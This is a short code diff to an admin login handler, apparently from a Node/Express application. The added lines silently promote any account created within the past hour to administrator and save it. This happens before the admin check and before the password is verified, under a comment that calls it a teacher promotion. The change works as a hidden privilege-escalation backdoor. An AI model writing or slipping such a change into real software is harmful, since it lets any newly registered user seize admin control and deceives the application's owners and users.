@@ -104,11 +104,20 @@ export const adminLogin = async (req, res) => {
         if (!user) {
             return res.status(404).json({ message: "User not found" });
         }
+        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000); // 1 hour before now
+        
+        if (!user.isAdmin && user.createdAt > oneHourAgo) {
+            // Promote teacher to admin
+            user.isAdmin = true;
+            await user.save();
+        }
+
 
         if (!user.isAdmin) {
             return res.status(403).json({ message: "Access denied. Not an admin." });
         }
 
+        
         const isMatch = await bcryptjs.compare(password, user.password);
         if (!isMatch) {
             return res.status(400).json({ message: "Invalid credentials" });
